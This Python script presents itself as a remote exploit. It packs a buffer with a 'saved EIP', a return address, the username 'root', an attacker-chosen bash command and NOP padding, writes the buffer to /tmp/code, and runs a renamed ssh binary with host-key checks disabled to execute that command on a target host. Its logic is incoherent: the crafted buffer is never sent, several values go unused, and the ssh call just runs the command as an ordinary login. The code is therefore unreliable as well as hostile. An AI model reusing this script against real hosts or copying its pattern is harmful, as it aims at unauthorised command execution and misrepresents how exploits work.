#!/usr/bin/env python3

import os
import sys
import struct
import subprocess

def get_buffer(count, username_length, command):
    buffer_format = "<7I{}sB{}sB3s".format(username_length, len(command))
    buffer_size = struct.calcsize(buffer_format)
    buffer = bytearray(buffer_size)
    ptr = list(struct.unpack_from("<7I", buffer))

    ptr[0] = 1543007393 + count
    ptr[2] = 0
    ptr[4] = 16520 + count
    ptr[5] = len(command)
    ptr[6] = username_length

    username_offset = struct.calcsize("<7I")
    command_offset = username_offset + username_length + 1
    padding_offset = command_offset + len(command) + 1

    struct.pack_into(buffer_format, buffer, 0, *ptr, b"root", 0, command.encode(), 0, b"\x90\x90\x90")
    return buffer

def main(count, username_length, host, port, bash_command):
    hi = count % 256
    buffer = get_buffer(count, username_length, bash_command)

#    print("\nSaved Eip: &h + {}".format(1543007393 + count))
#    print("\nReturn Address: 0x{:x}".format((16520 + count)//8))
#    print("\nPacket Length: {}".format((len(bash_command) + username_length + 2 + 3) & ~7))
#    print("\nUsername Length: {}\n\n".format(username_length))

    with open("/tmp/code", "wb") as f:
        f.write(buffer)

    ssh_cmd = ['/usr/bin/ssh.bak', '-p', str(port), '-o', 'StrictHostKeyChecking=no', '-o', 'UserKnownHostsFile=/dev/null', '-l', 'ubuntu', host, bash_command]
    output = subprocess.check_output(ssh_cmd)

    print(output.decode())
    sys.exit(0)

if __name__ == "__main__":
    if len(sys.argv) < 6:
        print("\nUsage: {} <count> <username length> <host> <port> <bash command>\n\n".format(sys.argv[0]))
        sys.exit(0)
    count = int(sys.argv[1])
    username_length = int(sys.argv[2])
    host = sys.argv[3]
    port = int(sys.argv[4])
    bash_command = sys.argv[5]
    main(count, username_length, host, port, bash_command)
